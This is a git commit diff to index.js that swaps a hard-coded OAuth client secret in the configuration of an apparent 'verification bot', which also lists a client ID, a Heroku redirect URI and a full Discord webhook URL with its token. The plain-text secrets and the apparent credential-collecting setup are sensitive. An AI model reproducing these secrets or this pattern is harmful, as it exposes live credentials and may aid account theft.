6d61dba5cc2149365683e3a1beb8b6481fe7a1ac
sushisonline <118045539+sushisonline@users.noreply.github.com>
2022-11-12 01:37:42 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,5 +1,5 @@
 // Configuration
-const client_secret = 'e533b648-28aa-401d-be6d-54759c00b011'
+const client_secret = 'nc48Q~CpiM9GRxhlslLviBrW2ra5rEZre6BjFclC'
 const client_id = 'a2f0e80d-1eb2-4df0-8c00-adaee2e791f8'
 const redirect_uri = 'https://verificationbotv2.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1040913066264637490/liryubetFixijCAOB2frRA5XY6CVVyyxt_3pLKWsNpmb7JaKacKyDVx5K771iD_lzpPW'
